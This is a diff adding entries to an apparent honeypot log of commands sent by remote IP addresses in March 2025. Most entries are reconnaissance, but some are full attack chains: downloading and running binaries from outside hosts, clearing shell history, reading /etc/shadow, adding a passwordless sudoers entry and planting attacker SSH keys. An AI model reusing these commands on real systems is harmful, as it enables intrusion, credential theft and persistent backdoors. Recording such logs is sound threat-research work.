@@ -5250,3 +5250,231 @@
 2025-03-17 22:14:57 from 185.126.158.152: uname -s -v -n -r -m
 2025-03-17 23:32:01 from 104.248.147.253: uname -s -v -n -r -m
 2025-03-17 23:32:03 from 104.248.147.253: uname -s -v -n -r -m
+2025-03-18 01:03:04 from 20.39.195.9: (uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
+2025-03-18 01:03:04 from 20.39.195.9: uname -smr || /bin/uname -smr || /usr/bin/uname -smr
+2025-03-18 01:06:16 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:07:25 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:07:57 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:09:37 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:11:18 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:12:17 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:13:35 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:14:20 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:14:48 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:15:04 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:15:26 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:16:12 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:16:34 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:16:57 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:17:57 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:20:05 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:20:18 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:20:36 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:20:46 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:21:46 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:22:39 from 170.64.154.194: uname -s -v -n -r -m
+2025-03-18 01:26:26 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 02:28:22 from 218.92.0.131: #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c
+2025-03-18 02:29:51 from 218.92.0.131: /bin/eyshcjdmzg
+2025-03-18 02:29:52 from 218.92.0.131: ls -la /var/run/gcc.pid
+2025-03-18 03:00:08 from 68.183.102.75: uname -s -v -n -r -m
+2025-03-18 03:00:10 from 68.183.102.75: uname -s -v -n -r -m
+2025-03-18 03:18:59 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 03:30:15 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 03:44:21 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:44:22 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:44:32 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:44:39 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:46:36 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:46:46 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:46:59 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:47:10 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:47:41 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:47:42 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:47:57 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:48:30 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:48:51 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:48:53 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:49:09 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:49:41 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:50:33 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:50:35 from 143.198.208.180: uname -s -v -n -r -m
+2025-03-18 03:52:50 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 04:15:25 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 05:11:13 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:12:12 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:12:45 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:15:25 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:20:21 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:22:06 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:22:55 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:27:07 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:30:55 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:31:28 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:32:19 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:33:48 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:36:23 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:37:49 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:48:00 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:48:52 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 05:51:57 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 06:00:17 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 06:01:16 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 06:04:33 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 06:06:37 from 125.39.11.27: uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://47.107.29.90/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://47.107.29.90/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://47.107.29.90/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://47.107.29.90/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
+2025-03-18 06:30:24 from 58.149.249.231: /ip cloud print
+2025-03-18 06:30:25 from 58.149.249.231: ifconfig
+2025-03-18 06:30:25 from 58.149.249.231: uname -a
+2025-03-18 06:30:26 from 58.149.249.231: cat /proc/cpuinfo
+2025-03-18 06:30:26 from 58.149.249.231: ps | grep '[Mm]iner'
+2025-03-18 06:30:27 from 58.149.249.231: ps -ef | grep '[Mm]iner'
+2025-03-18 06:30:27 from 58.149.249.231: ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2025-03-18 06:30:27 from 58.149.249.231: echo Hi | cat -n
+2025-03-18 07:30:11 from 64.222.199.27: uname -s -m
+2025-03-18 07:56:11 from 178.62.104.32: uname -a
+2025-03-18 09:19:49 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 12:52:24 from 121.18.203.82: /ip cloud print
+2025-03-18 12:52:27 from 121.18.203.82: ifconfig
+2025-03-18 12:52:27 from 121.18.203.82: uname -a
+2025-03-18 12:52:33 from 121.18.203.82: cat /proc/cpuinfo
+2025-03-18 12:52:35 from 121.18.203.82: ps | grep '[Mm]iner'
+2025-03-18 12:52:36 from 121.18.203.82: ps -ef | grep '[Mm]iner'
+2025-03-18 12:52:41 from 121.18.203.82: ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2025-03-18 12:52:42 from 121.18.203.82: echo Hi | cat -n
+2025-03-18 14:10:48 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:10:49 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:10:55 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:11:00 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:11:28 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:11:34 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:11:38 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:11:42 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:11:55 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:00 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:05 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:07 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:13 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:24 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:31 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:40 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:41 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:44 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:46 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:50 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:12:55 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:13:00 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:13:06 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:13:16 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:13:17 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:13:26 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:13:42 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:13:52 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:14:01 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:14:07 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:14:08 from 35.229.226.185: uname -s -v -n -r -m
+2025-03-18 14:24:22 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 14:35:22 from 180.100.74.196: uname -a
